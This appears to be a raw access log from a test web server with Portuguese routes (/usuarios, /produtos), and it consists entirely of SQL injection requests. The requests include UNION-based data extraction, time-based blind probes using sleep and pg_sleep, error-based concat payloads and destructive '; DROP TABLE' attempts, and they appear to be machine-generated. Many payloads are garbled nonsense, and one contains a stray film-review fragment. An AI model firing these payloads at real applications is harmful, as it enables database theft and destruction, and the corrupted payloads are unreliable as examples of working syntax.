Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_Nibl_%20)%20,vERsiMn%20(%20,%20(%20',Asding',%20,and%20,%20,,%200x0X0X0X0o101505%20)%20,(selEct%200x0) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alecture'%20)%20and%20'y'%20=%20'y HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@@verscomance(USER)%204,0x0x0b1010110%20)%20anD%20(%20(%20(%20%22%25%22%20LIKE%20%22 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20-%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEM%20UNOM;ALL%201%209--%20AND%20(SELECT%20(SELECT%201))%20&&%20True%20--%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20-%20- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEM;%20UNOM%20USER%20(%20corstations%20(%20:select%20count%20(%20*%20)%20,vorictane%20)%20,%20x%20vome%20to%201,%20)%20,1,10%20) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEm HTTP/1.1
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20as%20aani%20where%205973%20=%205973%20and%204345%20=%204150%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1')%20and%205556=(select%20count(*)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5)%20and%20('zfxp'='zfxp HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20)%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20(%20(%20'pssn'%20like%20'pssn HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20and%208407%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20and%20%22eslo%22%20like%20%22eslo HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20)%20as%20hdyn%20where%206027%20=%206027%20union%20all%20select%20null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20and%20(%20%22cwwv%22%20like%20%22cwwv HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20)%20and%206240%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20and%20(%20(%20(%20'snoa'%20=%20'snoa HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20(%20case%20when%20(%201272%20=%205883%20)%20then%201272%20else%20cast%20(%201%20as%20int%20)%20/%20(%20select%200%20from%20dual%20)%20end%20)%20from%20dual%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20as%20hews%20where%204832%20=%204832%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20where%203368%20=%203368%20and%209254%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20)%20)%20or%20elt%20(%206272%20=%206272,sleep%20(%205%20)%20)%20and%20(%20(%20(%209558%20=%209558 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20)%20or%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206270%20=%206270,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20and%20(%20(%20(%20'toft'%20=%20'toft HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20)%20)%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20)%20or%209643%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20(%20(%20'opan'%20like%20'opan%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'+%20(%20select%20'iyvn'%20where%209358%20=%209358%20or%20elt%20(%206272%20=%206272,sleep%20(%205%20)%20)%20)%20+' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20as%20wtfo%20where%205666%20=%205666%20union%20all%20select%20null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20)%20as%20jebl%20where%203407%20=%203407%20and%206414%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25'%20)%20)%20)%20or%208421%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20where%206222%20=%206222%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20and%20(%20(%20'bhlx'%20like%20'bhlx%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-7565'%20)%20)%20union%20all%20select%207745,7745,7745,7745,7745,7745 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a%20)%20and%20%22regi%22%20like%20%22regi%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20and%204386%20=%20utl_inaddr.get_host_address%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204386%20=%204386%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20or%20''%20=%20' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-8606%22%20or%205023%20=%20ctxsys.drithsx.sn%20(%205023,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%205023%20=%205023%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20as%20sjij%20where%208659%20=%208659 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25'%20)%20)%20and%209254%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/testor%20'something'%20like%20'some%25' HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271%23+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name+%28+ChR+%28+SINCT+OR+%27A%27+NOT+LIKE+%271 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%29+%3B%2Cule%2Ctale_nate%3B+%29+%2F%2A%2A%2F%28 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%28+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cwame_ters%2Celp_usert+int+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LiKE+%273%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%29+%2C+usernemant HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NiML+%2C+%28+%27SELECT+%40version+%28+%28SELECT+%28SELECT+%28SELECT+%28SELECT+%28SELECT+%28SELECT+1%29%29%29%29%29%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name+%28+Chr+%28+%22SINJ%27+LIKe+%27vaa%27+LIKe+%272%27+%29%2F%2A%2A%2F+or+%28+%22 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+userschamelver+1+teas+name+- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%28%2C+users%2Cgverpart+%28+granted+brony_table_nace+ThOR+gUSERhAN+%29+FROM+%28+SELECT+DISTINCT+%28+PASSWORD+%29+%2C+ROWNUM+AS+LIMIT+FROM+SYS.USER%24+%29+WHERE+LIMIT+%3D+4+%29+%29+AND+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmant+iDe+FoR+tublE_NALE%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NibL+%2C+%28+%2CSELECT+%40%40VERsiOn+%29+%2C+SElECt+%28SELECT+%28SELECT+8%29%29+%29+End+%3D+0x1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verale_tembent+tamen+tFON+LSE+FROm+the_table+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28%29+%2C+%29+%2C%3C%40%2CVersion%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+table_name+in+%27t%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+userschart%3Blabermandecs+alionpchard+and+1+%3D+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentybel%3Baylet+%29+%27+And+%27t%27+%3D+%27t%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40%40+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NiBL+%2C+%28+%2C1%2C1%2C1%2C1%2C19 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_name%27+FROM+dba__Hime HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_name%27+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%28%2C+select+%40%40version%29%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verale%2Cnumelet%27%2Clase%3B%27nucat%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C0x50000011101001+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_schema%2Ctable_name%29%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name+%28+chr+%28+%27sabetin%27+from+table HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+usercameredom%27+%29+%2B1%2C1%2C1%2C1%3B HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+%28+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+-+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SE HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+%28+%2C1%2C0x70+AND+1+%29+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SEM HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+%28+%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+S+.+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+ST HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SEM+Execute%2C+famoly+film+to+anyone+who+has+ever+got+the+show+that+were+laughs%2C+and+how+the+producers+except+it+still+works+about+in.+The+acting+is+considered+a+nice+perfect+film%2C+but+his+first+half+enjoyable+as+working+a+marriage+and+realit HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+1+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221%22+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221%23%22+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221%23%22+and+1+%3D+0+%29+or+%27qkle%27+%3D+%27qqkl HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+and+%28+%27eqfh%27+%3D+%27eqfh+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22..%22+%3D+1+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+where+2633+%3D+2633+union+all+select+null%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=SELEcT+%2A+FRom+USeRS+WhERe+iD+LiKE+0o9+or+%22%24%7B%22+or+%28sELECt+%28SELECT+1%29%29+%3D+%28sELECT+%28SELECT+1%29%29+or+%221%3C%22+noT+lIKe+%2228%22+oR+FalSe+--+0X1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+or+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+ydpu+%29+and+%28+%28+%22imlq%22+like+%22imlq HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-9098%27%7C%7C+%28+select+%27xodn%27+from+dual+where+8202+%3D+8202+union+all+select+8202%2C8202%2C8202%2C8202%2C8202%2C8202%2C8202+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+where+7640+%3D+7640+and+make_set+%28+8978+%3D+8594%2C8594+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%2C+%28+select+%28+case+when+%28+3717+%3D+3717+%29+then+1+else+3717%2A+%28+select+3717+from+master..sysdatabases+%29+end+%29+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+and+7533+%3D+7533+and+%27clqy%27+like+%27clqy HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-4785%27+or+%28+8459+%3D+8459+%29+%2A4906+and+%27esfn%27+%3D+%27esfn HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+as+pqab+where+4%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+gcrr+%29+%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+dbms_pipe.receive_message+%28+chr+%28+66+%29+%7C%7Cchr+%28+67+%29+%7C%7Cchr+%28+79+%29+%7C%7Cchr+%28+101+%29+%2C5+%29+from+dual+and+%28+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+%29+or+5356+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%29%29+as+ewyk+where+4828%3D4828+and+%28select+2%2A%28if%28%28select+%2A+from+%28select+concat%280x7171706a71%2C%28select+%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C+8446744073709551610%2C+8446744073709551610%29%29%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+%29+or+7552+%3D+%28+select+count+%28+%2A+%29+from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4+%29+and+%28+%28+%28+%27iqut%27+%3D+%27iqut HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+%271%27+union+select+%24%2B%22%5D%2C%40%40VERSION+--+1%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+and+5556+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+and+%28+%28+%27kpst%27+like+%27kpts HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%25%27+%29+%29+and+8594+%3D+%28+select+8594+from+pg_sleep+%28+5+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+%29+or+%28+select+9173+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9173+%3D+9173%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a+%29+and+%28+%28+%28+%27zeum%27+%3D+%27zeu HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%21%3C%40+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=0X0b0B100111101000011001000011100101001000000%2F%2Ab%3Co%2A%2F+%29%3F+%2F%2A%28SElECt%3E%28selECt+%28selecT+%28selecT+%28seLecT+0X7%29%29%29%29%29%29+U%2A%2F+%29%2F+%29+Or+%28Select+%28SELeCt+0x3O0X0o0B1011110111100%29%29%3D%7C+%28+%2F%2A%2A%2FselECt+COunt+%28+%2A+%29+%28+fROm+DoMAin.dOmAiNs+aS+t0b0x4%2CdOmaiN.COlUmns+AS+T0o2%2CD HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+as+omwk+where+1494+%3D+1494+and+char+%28+111+%29+%7C%7Cchar+%28+77+%29+%7C%7Cchar+%28+121+%29+%7C%7Cchar+%28+88+%29+%3D+regexp_substring+%28+repeat+%28+left+%28+crypt_key+%28+char+%28+65+%29+%7C%7Cchar+%28+69+%29+%7C%7Cchar+%28+83+%29+%2Cnull+%29+%2C0+%29+%2C500000 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-7981%25%22+union+all+select+4532%2C4532%2C4532%2C4532%2C4532%2C4532%2C4532%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+and+%28+%28+%27wusq%27+%3D+%27wusq HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+rlike+%28+select+%28+case+when+%28+7689+%3D+7689+%29+then+1+else+0x28+end+%29+%29+and+%28+%28+%27trzi%27+%3D+%27trzi+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+as+pghp+where+9086+%3D+9086 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20iname_1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gal_wabes%202%20)%20)%20and%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20(%20tall_fale%20version%20and%20'i'%20Not%20like%20'1'%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20OR%20'F'%20NOT%20LIKE%20'F' HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charely)%20)%20;versid%20)%20,1,1%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20iDe%20LICE%20&&%20true%20and%20true%20like%20(%20select%20@@version%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20verale%20comanteblas%20NATEM%20DY%20FOR%20TABLE%20PASS%201%20OR%20USSRANT%20) HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20by11,1%20)%20)%20)%20;1' HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20ullecale%20nomenatelbent%20'table' HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20)%20--%201' HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;%20and%20'1'='1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;1',1,1%20)%20)%20an HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20table_sccame_tabesm,vibas%20Nom%20FrOm%20table_NAmE%20FROM%20tubl_stames%20WHERE%20LIMET%20=%202%20)%20AND%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybes%20lyat%201%20F1%20)%20AND%20'1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynot',%20)%20%3Ean/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@@verscomance(USERT),@@VErS%20AND%201%20) HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20iDe%20FROM%20tUbenaND%20GRoCDeBlesP'd%20)%20_as%20susss, HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,mabceratel'siverytable%20and%20'ex'%20=%20'ix HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charent$$):loc_par_%20From%20Dba_pale HTTP/1.1
